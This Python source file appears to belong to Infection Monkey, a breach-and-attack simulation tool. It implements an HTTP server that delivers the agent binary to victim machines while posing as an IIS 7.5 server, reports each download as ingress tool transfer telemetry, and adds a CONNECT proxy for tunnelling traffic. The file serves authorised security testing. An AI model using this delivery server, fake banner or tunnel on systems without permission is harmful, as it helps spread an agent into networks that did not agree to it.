import http.server
import select
import socket
import threading
import urllib
from logging import getLogger
from urllib.parse import urlsplit

from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.transport.base import (
    PROXY_TIMEOUT,
    TransportProxyBase,
    update_last_serve_time,
)

logger = getLogger(__name__)


class FileServHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    victim_os = ""
    agent_binary_repository = None

    def version_string(self):
        return "Microsoft-IIS/7.5."

    @staticmethod
    def report_download(dest=None):
        pass

    def do_POST(self):
        self.send_error(501, "Unsupported method (POST)")
        return

    def do_GET(self):
        """Serve a GET request."""
        f, start_range, end_range = self.send_head()
        if f:
            f.seek(start_range, 0)
            chunk = 0x1000
            total = 0
            while chunk > 0:
                if start_range + chunk > end_range:
                    chunk = end_range - start_range
                try:
                    self.wfile.write(f.read(chunk))
                except Exception:
                    break
                total += chunk
                start_range += chunk

            if f.tell() == len(f.getbuffer()):
                if self.report_download(self.client_address):
                    self.close_connection = 1

            f.close()

    def do_HEAD(self):
        """Serve a HEAD request."""
        f, start_range, end_range = self.send_head()
        if f:
            f.close()

    def send_head(self):
        if self.path != "/" + urllib.parse.quote(self.victim_os.value):
            self.send_error(500, "")
            return None, 0, 0
        try:
            f = self.agent_binary_repository.get_agent_binary(self.victim_os)
        except IOError:
            self.send_error(404, "File not found")
            return None, 0, 0
        size = len(f.getbuffer())
        start_range = 0
        end_range = size

        if "Range" in self.headers:
            s, e = self.headers["range"][6:].split("-", 1)
            sl = len(s)
            el = len(e)
            if sl > 0:
                start_range = int(s)
                if el > 0:
                    end_range = int(e) + 1
            elif el > 0:
                ei = int(e)
                if ei < size:
                    start_range = size - ei

            if start_range == 0 and end_range - start_range >= size:
                self.send_response(200)
            else:
                self.send_response(206)
        else:
            self.send_response(200)

        self.send_header("Content-type", "application/octet-stream")
        self.send_header(
            "Content-Range",
            "bytes " + str(start_range) + "-" + str(end_range - 1) + "/" + str(size),
        )
        self.send_header("Content-Length", min(end_range - start_range, size))
        self.end_headers()
        return f, start_range, end_range

    def log_message(self, format_string, *args):
        logger.debug(
            "FileServHTTPRequestHandler: %s - - [%s] %s"
            % (self.address_string(), self.log_date_time_string(), format_string % args)
        )


class HTTPConnectProxyHandler(http.server.BaseHTTPRequestHandler):
    timeout = 30  # timeout with clients, set to None not to make persistent connection

    def version_string(self):
        return ""

    def do_CONNECT(self):
        logger.info("Received a connect request!")
        # just provide a tunnel, transfer the data with no modification
        req = self
        req.path = "https://%s/" % req.path.replace(":443", "")

        u = urlsplit(req.path)
        address = (u.hostname, u.port or 443)
        try:
            conn = socket.create_connection(address)
        except socket.error as e:
            logger.debug(
                "HTTPConnectProxyHandler: Got exception while trying to connect to %s: %s"
                % (repr(address), e)
            )
            self.send_error(504)  # 504 Gateway Timeout
            return
        self.send_response(200, "Connection Established")
        self.send_header("Connection", "close")
        self.end_headers()

        conns = [self.connection, conn]
        keep_connection = True
        while keep_connection:
            keep_connection = False
            rlist, wlist, xlist = select.select(conns, [], conns, self.timeout)
            if xlist:
                break
            for r in rlist:
                other = conns[1] if r is conns[0] else conns[0]
                data = r.recv(8192)
                if data:
                    other.sendall(data)
                    keep_connection = True
                    update_last_serve_time()
        conn.close()

    def log_message(self, format_string, *args):
        logger.debug(
            "HTTPConnectProxyHandler: %s - [%s] %s"
            % (self.address_string(), self.log_date_time_string(), format_string % args)
        )


class LockedHTTPServer(threading.Thread):
    """
    Same as HTTPServer used for file downloads just with locks to avoid racing conditions.
    You create a lock instance and pass it to this server's constructor. Then acquire the lock
    before starting the server and after it. Once the server starts it will release the lock
    and subsequent code will be able to continue to execute. That way subsequent code will
    always call already running HTTP server
    """

    # Seconds to wait until server stops
    STOP_TIMEOUT = 5

    def __init__(
        self,
        local_ip,
        local_port,
        victim_os,
        dropper_target_path,
        agent_binary_repository,
        lock,
        max_downloads=1,
    ):
        self._local_ip = local_ip
        self._local_port = local_port
        self._victim_os = victim_os
        self._dropper_target_path = dropper_target_path
        self._agent_binary_repository = agent_binary_repository
        self.max_downloads = max_downloads
        self.downloads = 0
        self._stopped = False
        self.lock = lock
        threading.Thread.__init__(self)
        self.daemon = True

    def run(self):
        class TempHandler(FileServHTTPRequestHandler):
            from common.utils.attack_utils import ScanStatus
            from infection_monkey.telemetry.attack.t1105_telem import T1105Telem

            victim_os = self._victim_os
            agent_binary_repository = self._agent_binary_repository

            @staticmethod
            def report_download(dest=None):
                logger.info("File downloaded from (%s,%s)" % (dest[0], dest[1]))
                TempHandler.T1105Telem(
                    TempHandler.ScanStatus.USED,
                    get_interface_to_target(dest[0]),
                    dest[0],
                    self._dropper_target_path,
                ).send()
                self.downloads += 1
                if not self.downloads < self.max_downloads:
                    return True
                return False

        httpd = http.server.HTTPServer((self._local_ip, self._local_port), TempHandler)
        self.lock.release()
        while not self._stopped and self.downloads < self.max_downloads:
            httpd.handle_request()

        self._stopped = True

    def stop(self, timeout=STOP_TIMEOUT):
        self._stopped = True
        self.join(timeout)


class HTTPConnectProxy(TransportProxyBase):
    def run(self):
        httpd = http.server.HTTPServer((self.local_host, self.local_port), HTTPConnectProxyHandler)
        httpd.timeout = PROXY_TIMEOUT
        while not self._stopped:
            httpd.handle_request()
